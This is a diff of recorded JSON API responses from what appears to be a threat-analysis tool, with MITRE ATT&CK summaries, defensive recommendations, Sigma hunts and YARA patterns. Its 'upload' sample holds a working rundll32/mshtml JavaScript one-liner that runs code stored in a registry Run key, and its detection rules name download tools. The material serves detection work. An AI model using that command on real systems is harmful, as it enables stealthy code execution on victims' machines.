         "die": {
@@ -8969,22 +9368,65 @@
               ]
             }
           },
-          "elapsed_ms": 107.7,
+          "elapsed_ms": 100.3,
           "status": 200
         },
         "narrate": {
           "body": {
             "narrative": {
-              "analyst_summary": "",
-              "executive_summary": "",
+              "analyst_summary": "During **Execution** the analyst observed `T1059.007` (JavaScript). During **Defense Evasion** the analyst observed `T1027` (Obfuscated Files or Information), `T1218.011` (Rundll32). During **Command And Control** the analyst observed `T1105` (Ingress Tool Transfer).",
+              "behavior_summary": [
+                {
+                  "activity": "1 technique(s) observed (T1059.007). Attacker objective: Execute attacker code on the endpoint.",
+                  "kill_chain": "Execution",
+                  "phase": "Execution"
+                },
+                {
+                  "activity": "2 technique(s) observed (T1027, T1218.011). Attacker objective: Evade EDR / AV detection.",
+                  "kill_chain": "Defense Evasion",
+                  "phase": "Defense Evasion"
+                },
+                {
+                  "activity": "1 technique(s) observed (T1105). Attacker objective: Maintain a channel to attacker infrastructure.",
+                  "kill_chain": "Command And Control",
+                  "phase": "Command And Control"
+                }
+              ],
+              "executive_summary": "Investigation surface exposes 4 MITRE ATT&CK technique(s) mapped across 3 tactic(s): **Execution** (1 tech.), **Defense Evasion** (2 tech.), **Command And Control** (1 tech.). The observed progression indicates active adversary tradecraft, prioritise containment against the highest-risk tactic first.",
+              "likely_objective": [
+                "Execute attacker code on the endpoint",
+                "Evade EDR / AV detection",
+                "Maintain a channel to attacker infrastructure"
+              ],
               "mitre_matrix": [],
-              "recommended_actions": [],
-              "sigma_hunts": [],
+              "overall_assessment": {
+                "attack_progress_pct": 45,
+                "confidence": "Medium",
+                "primary_objective": "Evade EDR / AV detection",
+                "risk": "High"
+              },
+              "recommended_actions": [
+                "[Execution] Enable AMSI on all endpoints; enforce Constrained Language Mode for non-admin PowerShell; disable Office macros from the internet zone.",
+                "[Defense Evasion] Alert on any tampering with Defender, Sysmon, or EDR services; deploy tamper-protection where available.",
+                "[Command And Control] Block observed C2 IOCs at the proxy / firewall / DNS; hunt for other hosts beaconing to the same infrastructure.",
+                "[T1027] Alert on high-entropy PowerShell script blocks (>4.5 bits/char) and Base64 strings longer than 1 KB inside `-EncodedCommand` payloads.",
+                "[T1218.011] Baseline signed-DLL entrypoints commonly invoked via rundll32; alert on rundll32.exe loading DLLs from `%TEMP%`, `%APPDATA%`, or a UNC path.",
+                "[T1105] Block untrusted domains at proxy/DNS; hunt for `certutil -urlcache`, `bitsadmin /transfer`, `curl.exe`, `Invoke-WebRequest`, and `wget.exe` invocations from user workstations."
+              ],
+              "sigma_hunts": [
+                "Sigma: process powershell.exe command_line contains `-enc` OR `-encodedcommand` with base64 length > 1000",
+                "Sigma: process rundll32.exe with DLL argument in (%TEMP%, %APPDATA%, \\\\\\\\*)",
+                "Sigma: process any_of (`certutil.exe -urlcache`, `bitsadmin.exe /transfer`, `curl.exe`, `wget.exe`) OR powershell.exe with `Invoke-WebRequest`/`iwr`/`Net.WebClient`"
+              ],
               "threat_actor_context": "",
-              "yara_ideas": []
+              "yara_ideas": [
+                "YARA: regex /-(e|enc|encodedcommand)\\s+[A-Za-z0-9+/]{200,}={0,2}/i",
+                "YARA: regex /rundll32.exe\\s+(%TEMP%|%APPDATA%|\\\\\\\\[^\\s,]+),/i",
+                "YARA: strings \"certutil.exe -urlcache\", \"bitsadmin /transfer\", \"Invoke-WebRequest\", \"DownloadFile\""
+              ]
             }
           },
-          "elapsed_ms": 106.1,
+          "elapsed_ms": 103.3,
           "status": 200
         },
         "upload": {
@@ -9012,7 +9454,7 @@
             ],
             "text": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write(\"\\74script language=jscript>eval(new ActiveXObject(\\\"WScript.Shell\\\").RegRead(\\\"HKCU\\\\\\\\software\\\\\\\\microsoft\\\\\\\\windows\\\\\\\\currentversion\\\\\\\\run\\\\\\\\evil\\\"));\\74/script>\")"
           },
-          "elapsed_ms": 109.9,
+          "elapsed_ms": 107.6,
           "status": 200
         }
       }
